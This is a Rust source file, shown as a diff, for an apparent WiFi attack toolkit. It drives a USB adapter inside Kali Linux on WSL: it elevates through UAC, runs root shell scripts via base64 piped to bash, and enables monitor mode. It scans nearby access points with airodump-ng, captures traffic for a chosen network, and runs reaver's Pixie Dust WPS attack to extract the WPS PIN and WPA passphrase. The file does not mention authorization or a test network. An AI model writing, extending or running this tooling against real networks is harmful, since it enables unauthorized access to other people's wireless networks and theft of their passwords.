@@ -1,0 +1,327 @@
+//! WSL/Kali hardware-attack integration: Tenda U2 (AIC8800DC) USB adapter.
+//!
+//! Flow: usbipd attach -> (fake-CD eject -> re-attach) -> monitor mode ->
+//! scan/capture/pixiedust, all executed inside kali-linux WSL as root.
+//! Capture files are written straight to the Windows logs/caps dir via /mnt/e.
+
+use anyhow::{bail, Result};
+use serde::Serialize;
+use std::process::Command;
+use std::time::Duration;
+
+pub const USBIPD: &str = r"C:\Program Files\usbipd-win\usbipd.exe";
+
+#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
+#[serde(rename_all = "lowercase")]
+pub enum AdapterMode {
+    Msc,   // fake CD-ROM (a69c:5721), needs eject switch
+    Wlan,  // WiFi mode (2604:0014 AIC8800DC)
+}
+
+#[derive(Debug, Clone, Serialize)]
+pub struct AdapterInfo {
+    pub busid: String,
+    pub mode: AdapterMode,
+    pub shared: bool,
+    pub attached: bool,
+}
+
+#[derive(Debug, Clone, Serialize)]
+pub struct Ap {
+    pub bssid: String,
+    pub channel: String,
+    pub power: i32,
+    pub essid: String,
+}
+
+#[derive(Debug, Clone, Serialize)]
+pub struct PixieOut {
+    pub bssid: String,
+    pub pin: Option<String>,
+    pub psk: Option<String>,
+    pub tail: String,
+}
+
+fn decode_utf8(bytes: &[u8]) -> String {
+    String::from_utf8_lossy(bytes).into_owned()
+}
+
+fn run(prog: &str, args: &[&str]) -> Result<String> {
+    let out = Command::new(prog).args(args).output()?;
+    Ok(format!("{}{}", decode_utf8(&out.stdout), decode_utf8(&out.stderr)))
+}
+
+/// usbipd list -> first matching AIC adapter (MSC or WLAN mode).
+pub fn adapter() -> Option<AdapterInfo> {
+    let out = run(USBIPD, &["list"]).ok()?;
+    let mut busid = None;
+    let mut mode = None;
+    let mut shared = false;
+    let mut attached = false;
+    for line in out.lines() {
+        let is_msc = line.contains("a69c:5721");
+        let is_wlan = line.contains("2604:0014") || line.to_lowercase().contains("aic8800");
+        if !(is_msc || is_wlan) {
+            continue;
+        }
+        busid = line.split_whitespace().next().map(|s| s.to_string());
+        mode = Some(if is_msc { AdapterMode::Msc } else { AdapterMode::Wlan });
+        shared = line.contains("Shared") && !line.contains("Not shared");
+        attached = line.contains("Attached");
+        break;
+    }
+    Some(AdapterInfo { busid: busid?, mode: mode?, shared, attached })
+}
+
+/// Attach to WSL. When the device is not shared, auto-elevate (UAC popup)
+/// a PowerShell that binds + attaches, mirroring the manual setup.
+pub fn attach(info: &AdapterInfo) -> Result<()> {
+    if info.attached {
+        return Ok(());
+    }
+    if !info.shared {
+        // elevated bind+attach (UAC confirmation is part of the flow)
+        let script = format!(
+            "usbipd bind --busid {}; usbipd attach --wsl --busid {}",
+            info.busid, info.busid
+        );
+        let st = Command::new("powershell")
+            .args([
+                "-NoProfile",
+                "-Command",
+                &format!(
+                    "Start-Process powershell -Verb RunAs -Wait -ArgumentList '-Command','{}'",
+                    script.replace('\'', "''")
+                ),
+            ])
+            .output()?;
+        if !st.status.success() {
+            bail!("提升权限执行 bind/attach 失败（UAC 被取消？）");
+        }
+    } else {
+        let st = Command::new(USBIPD)
+            .args(["attach", "--wsl", "--busid", &info.busid])
+            .output()?;
+        if !st.status.success() {
+            bail!(
+                "usbipd attach 失败: {}",
+                decode_utf8(&st.stderr)
+            );
+        }
+    }
+    std::thread::sleep(Duration::from_secs(3));
+    Ok(())
+}
+
+/// Run a shell snippet inside the Kali WSL distro as root (UTF-8 output).
+pub fn kali(distro: &str, script: &str) -> Result<String> {
+    // wsl.exe re-quotes its command line, mangling nested quotes in complex
+    // scripts. Base64 the payload and decode inside — quote-proof.
+    let b64 = {
+        use std::io::Write as _;
+        let mut b64 = String::new();
+        let engine = base64::engine::general_purpose::STANDARD;
+        use base64::Engine as _;
+        b64.push_str(&engine.encode(script));
+        b64
+    };
+    let out = Command::new("wsl.exe")
+        .args([
+            "-d", distro, "-u", "root", "--", "bash", "-c",
+            &format!("echo {b64} | base64 -d | bash"),
+        ])
+        .output()?;
+    // stdout only: WSL prints PATH-translation warnings to stderr which would
+    // otherwise contaminate parsed output.
+    Ok(decode_utf8(&out.stdout))
+}
+
+/// Kali-side: eject the fake CD-ROM so the adapter re-enumerates as WLAN.
+pub fn eject_msc(distro: &str) -> Result<bool> {
+    let script = r#"
+dev=$(ls -l /dev/disk/by-id/ 2>/dev/null | grep -i AIC | grep -v part | awk '{print $NF}' | xargs -n1 basename | head -1)
+if [ -z "$dev" ]; then echo NO_MSC; exit 0; fi
+umount /dev/${dev}1 2>/dev/null
+eject /dev/$dev && echo EJECTED || echo EJECT_FAIL
+"#;
+    let out = kali(distro, script)?;
+    if out.contains("NO_MSC") {
+        return Ok(false);
+    }
+    if out.contains("EJECT_FAIL") {
+        bail!("eject 失败（设备忙碌？）");
+    }
+    Ok(true)
+}
+
+/// First wlx* interface in Kali, if any.
+pub fn find_iface(distro: &str) -> Option<String> {
+    let out = kali(distro, "ip -o link show 2>/dev/null | awk -F': ' '/wlx/{print $2; exit}'").ok()?;
+    out.lines()
+        .rev()
+        .map(|l| l.trim().trim_end_matches(':').to_string())
+        .find(|l| !l.is_empty() && l.starts_with("wlx"))
+}
+
+/// Is the WLAN-mode device visible inside Kali?
+pub fn has_device(distro: &str) -> bool {
+    kali(distro, "lsusb 2>/dev/null | grep -qi '2604:0014' && echo YES")
+        .map(|o| o.contains("YES"))
+        .unwrap_or(false)
+}
+
+/// Load the aic8800 driver modules (WSL has no udev coldplug, so this is
+/// required after every attach / WSL restart).
+pub fn load_driver(distro: &str) -> Result<()> {
+    let out = kali(distro, "modprobe aic8800_fdrv 2>&1; sleep 1; lsmod | grep -q aic8800_fdrv && echo LOADED")?;
+    if !out.contains("LOADED") {
+        bail!("aic8800_fdrv 加载失败: {}", out.trim());
+    }
+    Ok(())
+}
+
+/// Force-detach a stale usbipd attachment (e.g. after WSL VM restart).
+pub fn detach(busid: &str) {
+    let _ = Command::new(USBIPD).args(["detach", "--busid", busid]).output();
+}
+
+/// Eject the fake CD-ROM on the WINDOWS side (Shell COM, no admin needed).
+/// After this the adapter re-enumerates in WLAN mode, unclaimed by any driver.
+pub fn windows_eject_msc() -> Result<()> {
+    let ps = "New-Object -ComObject Shell.Application | Out-Null;               $sh = New-Object -ComObject Shell.Application;               $sh.NameSpace(17).Items() | Where-Object { $_.Name -match 'AIC|aicsemi' } |               ForEach-Object { $_.InvokeVerb('Eject') }; Start-Sleep 2";
+    let out = Command::new("powershell").args(["-NoProfile", "-Command", ps]).output()?;
+    let text = format!("{}{}", decode_utf8(&out.stdout), decode_utf8(&out.stderr));
+    let _ = text;
+    Ok(())
+}
+
+/// Bring the interface up in monitor mode.
+pub fn up_monitor(distro: &str, iface: &str) -> Result<()> {
+    let script = format!(
+        r#"ip link set {i} down 2>/dev/null
+o=$(iw dev {i} set type monitor 2>&1)
+if [ $? -ne 0 ]; then echo "SETFAIL:$o"; exit 0; fi
+for t in 1 2 3 4 5; do ip link set {i} up 2>/dev/null && break; sleep 2; done
+ip -o link show {i} 2>/dev/null | grep -o 'UP' | head -1"#,
+        i = iface
+    );
+    let out = kali(distro, &script)?;
+    if let Some(line) = out.lines().find(|l| l.starts_with("SETFAIL:")) {
+        bail!("切监听失败: {}", &line[8..]);
+    }
+    if !out.contains("UP") {
+        bail!("接口未能 UP（ENOBUFS 竞态？）: {}", out.trim());
+    }
+    Ok(())
+}
+
+/// Active scan sweep via airodump CSV (12s), parsed into an AP list.
+pub fn scan_aps(distro: &str, iface: &str) -> Result<Vec<Ap>> {
+    let script = format!(
+        "rm -f /tmp/wtk_scan*.csv; timeout 13 airodump-ng {i} --band bg -w /tmp/wtk_scan --output-format csv >/dev/null 2>&1; cat /tmp/wtk_scan-01.csv 2>/dev/null",
+        i = iface
+    );
+    let csv = kali(distro, &script)?;
+    Ok(parse_ap_csv(&csv))
+}
+
+/// Parse airodump-ng CSV (first table only).
+pub fn parse_ap_csv(csv: &str) -> Vec<Ap> {
+    let mut aps: Vec<Ap> = Vec::new();
+    for line in csv.lines() {
+        let line = line.trim_end_matches('\r');
+        if line.to_uppercase().starts_with("BSSID,") {
+            continue; // header row
+        }
+        let p: Vec<&str> = line.split(',').collect();
+        if p.len() < 15 {
+            continue;
+        }
+        let bssid = p[0].trim().to_lowercase();
+        // real MAC: 17 chars with colons (skips the CSV header row)
+        if bssid.len() != 17 || bssid.matches(':').count() != 5 {
+            continue;
+        }
+        let channel = p[3].trim().to_string();
+        let power: i32 = p[8].trim().parse().unwrap_or(-100);
+        let essid = p[13].trim().to_string();
+        let idlen: i32 = p[12].trim().parse().unwrap_or(-1);
+        if idlen == 0 {
+            continue; // hidden with zero length
+        }
+        if aps.iter().any(|a| a.bssid == bssid) {
+            continue;
+        }
+        let essid = if essid.is_empty() { "(隐藏)".into() } else { essid };
+        aps.push(Ap { bssid, channel, power, essid });
+    }
+    aps.sort_by_key(|a| std::cmp::Reverse(a.power));
+    aps
+}
+
+/// Capture a dedicated cap for one BSSID/channel into the Windows caps dir.
+/// `caps_dir_win` = E:\project\wifi-toolkit\logs\caps ; name = sanitized essid_bssid4.
+pub fn capture(distro: &str, iface: &str, bssid: &str, channel: &str, essid: &str, sec: u64, caps_dir_win: &str) -> Result<String> {
+    let safe: String = essid
+        .chars()
+        .map(|c| if c.is_ascii_alphanumeric() || c == '-' || c == '_' { c } else { '_' })
+        .collect();
+    let b4 = bssid.replace(':', "")[0..4].to_string();
+    let name = format!("{}_{}", safe, b4);
+    let script = format!(
+        "mkdir -p '{d}' && rm -f '{d}/{n}'*.cap && timeout {s} airodump-ng {i} -c {c} --bssid {b} -w '{d}/{n}' --band bg >/dev/null 2>&1; ls '{d}'/{n}*.cap 2>/dev/null | head -1",
+        d = caps_dir_win.replace('\\', "/"),
+        n = name,
+        s = sec,
+        i = iface,
+        c = channel,
+        b = bssid
+    );
+    let out = kali(distro, &script)?;
+    let file = out.lines().last().unwrap_or("").trim().to_string();
+    if file.is_empty() || !file.ends_with(".cap") {
+        bail!("抓包未产出 cap 文件: {}", out.trim());
+    }
+    Ok(file)
+}
+
+/// Run reaver PixieDust against one BSSID; parse PIN / PSK from output.
+pub fn pixie(distro: &str, iface: &str, bssid: &str, timeout_sec: u64) -> Result<PixieOut> {
+    let script = format!(
+        "timeout {t} reaver -i {i} -b {b} --pixie-dust -vv 2>&1; echo __DONE__",
+        t = timeout_sec,
+        i = iface,
+        b = bssid
+    );
+    let out = kali(distro, &script)?;
+
+    let mut pin = None;
+    let mut psk = None;
+    for line in out.lines() {
+        if pin.is_none() {
+            if let Some(rest) = line.strip_prefix("[+] WPS PIN: ") {
+                pin = Some(rest.trim().trim_matches('\'').to_string());
+            }
+        }
+        if psk.is_none() {
+            if let Some(rest) = line.strip_prefix("[+] WPA PSK: ") {
+                psk = Some(rest.trim().trim_matches('\'').to_string());
+            }
+        }
+    }
+    let tail: String = out
+        .lines()
+        .rev()
+        .take(25)
+        .collect::<Vec<_>>()
+        .into_iter()
+        .rev()
+        .map(|l| format!("{}\n", l))
+        .collect();
+    Ok(PixieOut {
+        bssid: bssid.to_string(),
+        pin,
+        psk,
+        tail: tail.chars().take(1500).collect(),
+    })
+}
